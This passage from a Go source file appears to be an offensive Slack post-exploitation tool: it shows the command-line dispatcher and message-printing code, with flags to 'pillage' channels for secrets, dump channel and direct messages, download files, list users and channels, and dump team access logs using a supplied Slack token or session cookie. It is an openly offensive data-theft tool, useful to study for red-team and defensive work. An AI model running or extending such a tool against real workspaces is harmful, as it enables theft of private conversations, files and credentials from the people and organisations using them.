			}
			// Print attachments and files
			if attachments, ok := msg["attachments"].([]interface{}); ok {
				for _, att := range attachments {
					if attMap, ok := att.(map[string]interface{}); ok {
						if text, ok := attMap["text"].(string); ok {
							fmt.Printf("Attachment: %s\n", text)
						}
					}
				}
			}
			if files, ok := msg["files"].([]interface{}); ok {
				for _, file := range files {
					if fileMap, ok := file.(map[string]interface{}); ok {
						if name, ok := fileMap["name"].(string); ok {
							if url, ok := fileMap["url_private"].(string); ok {
								fmt.Printf("File: %s (%s)\n", name, url)
							}
						}
					}
				}
			}
		}
	}

	return nil
}

func init() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "\nArguments:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s --token xoxb-1234-5678 --check-permissions\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --check-permissions\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --pillage\n", os.Args[0])
	}
}

func main() {
	var token string
	var cookie string
	var workspaceURL string
	var proxyURL string
	var checkPerms bool
	var pillageTarget string
	var outputJSON string
	var test bool
	var downloadFilesFlag bool
	var outputDirectory string
	var listUsers bool
	var listChannels bool
	var listFilesFlag bool
	var dumpLogs bool
	var verbose bool
	var dumpMessagesChannel string
	var noBanner bool
	var listDMs bool
	var dumpDMChannelID string

	// Define flags to match Python's argparse options
	flag.StringVar(&token, "token", "", "Slack API token")
	flag.StringVar(&cookie, "cookie", "", "Slack cookie")
	flag.StringVar(&workspaceURL, "workspace-url", "", "Workspace URL (required when using cookie)")
	flag.StringVar(&proxyURL, "proxy", "", "Proxy URL (optional)")
	flag.StringVar(&pillageTarget, "pillage", "", "Search channel for secrets (specify channel name or 'all' for all channels)")
	flag.StringVar(&outputJSON, "output-json", "", "Save output in JSON format to the specified file")
	flag.BoolVar(&test, "test", false, "Test Slack credentials")
	flag.BoolVar(&downloadFilesFlag, "download-files", false, "Download files")
	flag.StringVar(&outputDirectory, "output-directory", "", "Output directory for downloaded files")
	flag.BoolVar(&listUsers, "list-users", false, "Get list of users")
	flag.BoolVar(&listChannels, "list-channels", false, "Get list of channels")
	flag.BoolVar(&checkPerms, "check-permissions", false, "Check API token permissions")
	flag.BoolVar(&listFilesFlag, "list-files", false, "List all files from all channels")
	flag.BoolVar(&dumpLogs, "dump-logs", false, "Dump team access logs")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging for troubleshooting")
	flag.StringVar(&dumpMessagesChannel, "dump-messages", "", "Dump messages from specified channel or username (for DMs)")
	flag.BoolVar(&noBanner, "nobanner", false, "Disable banner output")
	flag.BoolVar(&listDMs, "list-dm", false, "List all DM channels")
	flag.StringVar(&dumpDMChannelID, "dump-dm", "", "Dump messages from specified DM channel ID (e.g., D04ES1BJ1E3)")

	// Add short versions of flags
	flag.StringVar(&outputJSON, "o", "", "Short for --output-json")
	flag.StringVar(&proxyURL, "p", "", "Short for --proxy")
	flag.BoolVar(&verbose, "v", false, "Short for --verbose")

	// Print banner before parsing flags
	printBanner(!noBanner)

	flag.Parse()

	// Validate required arguments
	if token == "" && cookie == "" {
		log.Fatal("Either token or cookie must be provided")
	}

	if cookie != "" && workspaceURL == "" {
		log.Fatal("workspace-url is required when using cookie authentication")
	}

	// Validate that at least one action is specified
	if !test && !listUsers && !listChannels && !checkPerms && !listFilesFlag && 
	   !downloadFilesFlag && !dumpLogs && pillageTarget == "" && dumpMessagesChannel == "" && 
	   !listDMs && dumpDMChannelID == "" {
		log.Fatal("At least one action must be specified")
	}

	// Execute requested actions
	if checkPerms {
		if err := checkPermissions(token, cookie, workspaceURL, proxyURL); err != nil {
			log.Fatal(err)
		}
	}

	// Add list-files handling
	if listFilesFlag {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := listFiles(credentials, proxyURL, outputJSON); err != nil {
			log.Fatal(err)
		}
	}

	// Add download-files handling
	if downloadFilesFlag {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := downloadFiles(credentials, proxyURL, outputDirectory); err != nil {
			log.Fatal(err)
		}
	}

	// Add pillage handling
	if pillageTarget != "" {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := pillageWorkspace(credentials, proxyURL, pillageTarget, outputJSON); err != nil {
			log.Fatal(err)
		}
	}

	// Add list-users handling
	if listUsers {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := listUsersFunc(credentials, proxyURL, outputJSON); err != nil {
			log.Fatal(err)
		}
	}

	// Add list-channels handling
	if listChannels {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := listChannelsFunc(credentials, proxyURL, outputJSON); err != nil {
			log.Fatal(err)
		}
	}

	// Add dump-messages handling
	if dumpMessagesChannel != "" {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := dumpMessages(credentials, proxyURL, dumpMessagesChannel, outputJSON); err != nil {
			log.Fatal(err)
		}
	}

	// Add list-dm handling
	if listDMs {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := listDMChannels(credentials, proxyURL, outputJSON); err != nil {
			log.Fatal(err)
		}
	}

	// Add dump-dm handling
	if dumpDMChannelID != "" {
		credentials := make(map[string]string)
		if token != "" {
			credentials["token"] = token
		} else if cookie != "" {
			credentials["cookie"] = cookie
			credentials["workspace_url"] = workspaceURL
		}

		if err := dumpDMChannel(credentials, proxyURL, dumpDMChannelID, outputJSON); err != nil {
			log.Fatal(err)
		}
	}

	// TODO: Implement other actions (test, listUsers, listChannels, etc.)
} 